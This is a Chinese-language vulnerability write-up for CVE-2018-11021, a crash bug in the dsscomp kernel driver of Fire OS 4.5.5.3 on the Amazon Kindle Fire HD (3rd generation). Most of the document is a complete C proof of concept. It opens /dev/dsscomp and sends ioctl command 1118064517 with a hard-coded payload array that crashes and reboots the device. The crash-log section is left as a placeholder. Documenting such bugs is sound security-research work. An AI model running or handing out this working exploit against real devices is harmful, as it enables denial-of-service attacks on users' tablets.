<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</h1><h2>一、漏洞简介</h2><p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/video/omap2/dsscomp/device.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ dsscomp与命令<strong>1118064517</strong>并导致内核崩溃。</p><p>要探索此漏洞，必须打开设备文件/ dev / dsscomp，并使用命令<strong>1118064517</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p><h2>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p><h2>三、复现过程</h2><h3>poc</h3><p>/*<br /> * This is poc of Kindle Fire HD 3rd<br /> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.<br /> * Related buggy struct name is dsscomp_setup_dispc_data.<br /> * This Poc should run with permission to do ioctl on /dev/dsscomp.<br /> *<br /> */<br />#include &lt;stdio.h&gt;<br />#include &lt;fcntl.h&gt;<br />#include &lt;errno.h&gt;<br />#include &lt;sys/ioctl.h&gt;<br /><br />const static char *driver = "/dev/dsscomp";<br />static command = 1118064517; <br /><br />int main(int argc, char **argv, char **env) {<br />    unsigned int payload[] = {<br />    0xffffffff,<br />    0x00000003,<br />    0x5d200040,<br />    0x79900008,<br />    0x8f5928bd,<br />    0x78b02422,<br />    0x00000000,<br />    0xffffffff,<br />    0xf4c50400,<br />    0x007fffff,<br />    0x8499f562,<br />    0xffff0400,<br />    0x001b131d,<br />    0x60818210,<br />    0x00000007,<br />    0xffffffff,<br />    0x00000000,<br />    0x9da9041c,<br />    0xcd980400,<br />    0x001f03f4,<br />    0x00000007,<br />    0x2a34003f,<br />    0x7c80d8f3,<br />    0x63102627,<br />    0xc73643a8,<br />    0xa28f0665,<br />    0x00000000,<br />    0x689e57b4,<br />    0x01ff0008,<br />    0x5e7324b1,<br />    0xae3b003f,<br />    0x0b174d86,<br />    0x00000400,<br />    0x21ffff37,<br />    0xceb367a4,<br />    0x00000040,<br />    0x00000001,<br />    0xec000f9e,<br />    0x00000001,<br />    0x000001ff,<br />    0x00000000,<br />    0x00000000,<br />    0x0000000f,<br />    0x0425c069,<br />    0x038cc3be,<br />    0x0000000f,<br />    0x00000080,<br />    0xe5790100,<br />    0x5b1bffff,<br />    0x0000d355,<br />    0x0000c685,<br />    0xa0070000,<br />    0x0010ffff,<br />    0x00a0ff00,<br />    0x00000001,<br />    0xff490700,<br />    0x0832ad03,<br />    0x00000006,<br />    0x00000002,<br />    0x00000001,<br />    0x81f871c0,<br />    0x738019cb,<br />    0xbf47ffff,<br />    0x00000040,<br />    0x00000001,<br />    0x7f190f33,<br />    0x00000001,<br />    0x8295769b,<br />    0x0000003f,<br />    0x869f2295,<br />    0xffffffff,<br />    0xd673914f,<br />    0x05055800,<br />    0xed69b7d5,<br />    0x00000000,<br />    0x0107ebbd,<br />    0xd214af8d,<br />    0xffff4a93,<br />    0x26450008,<br />    0x58df0000,<br />    0xd16db084,<br />    0x03ff30dd,<br />    0x00000001,<br />    0x209aff3b,<br />    0xe7850800,<br />    0x00000002,<br />    0x30da815c,<br />    0x426f5105,<br />    0x0de109d7,<br />    0x2c1a65fc,<br />    0xfcb3d75f,<br />    0x00000000,<br />    0x00000001,<br />    0x8066be5b,<br />    0x00000002,<br />    0xffffffff,<br />    0x5cf232ec,<br />    0x680d1469,<br />    0x00000001,<br />    0x00000020,<br />    0xffffffff,<br />    0x00000400,<br />    0xd1d12be8,<br />    0x02010200,<br />    0x01ffc16f,<br />    0xf6e237e6,<br />    0x007f0000,<br />    0x01ff08f8,<br />    0x000f00f9,<br />    0xbad07695,<br />    0x00000000,<br />    0xbaff0000,<br />    0x24040040,<br />    0x00000006,<br />    0x00000004,<br />    0x00000000,<br />    0xbc2e9242,<br />    0x009f5f08,<br />    0x00800000,<br />    0x00000000,<br />    0x00000001,<br />    0xff8800ff,<br />    0x00000001,<br />    0x00000000,<br />    0x000003f4,<br />    0x6faa8472,<br />    0x00000400,<br />    0xec857dd5,<br />    0x00000000,<br />    0x00000040,<br />    0xffffffff,<br />    0x3f004874,<br />    0x0000b77a,<br />    0xec9acb95,<br />    0xfacc0001,<br />    0xffff0001,<br />    0x0080ffff,<br />    0x3600ff03,<br />    0x00000001,<br />    0x8fff7d7f,<br />    0x6b87075a,<br />    0x00000000,<br />    0x41414141,<br />    0x41414141,<br />    0x41414141,<br />    0x41414141,<br />    0x001001ff,<br />    0x00000000,<br />    0x00000001,<br />    0xff1f0512,<br />    0x00000001,<br />    0x51e32167,<br />    0xc18c55cc,<br />    0x00000000,<br />    0xffffffff,<br />    0xb4aaf12b,<br />    0x86edfdbd,<br />    0x00000010,<br />    0x0000003f,<br />    0xabff7b00,<br />    0xffff9ea3,<br />    0xb28e0040,<br />    0x000fffff,<br />    0x458603f4,<br />    0xffff007f,<br />    0xa9030f02,<br />    0x00000001,<br />    0x002cffff,<br />    0x9e00cdff,<br />    0x00000004,<br />    0x41414141,<br />    0x41414141,<br />    0x41414141,<br />    0x41414141 };<br /><br />        int fd = 0;<br />        fd = open(driver, O_RDWR);<br />        if (fd &lt; 0) {<br />            printf("Failed to open %s, with errno %d\n", driver, errno);<br />            system("echo 1 &gt; /data/local/tmp/log");<br />            return -1;<br />        }<br /><br />        printf("Try open %s with command 0x%x.\n", driver, command);<br />        printf("System will crash and reboot.\n");<br />        if(ioctl(fd, command, &amp;payload) &lt; 0) {<br />            printf("Allocation of structs failed, %d\n", errno);<br />            system("echo 2 &gt; /data/local/tmp/log");<br />            return -1;<br />        }<br />        close(fd);<br />        return 0;<br />}</p><h3>崩溃日志</h3><p>To be added here</p></body></html>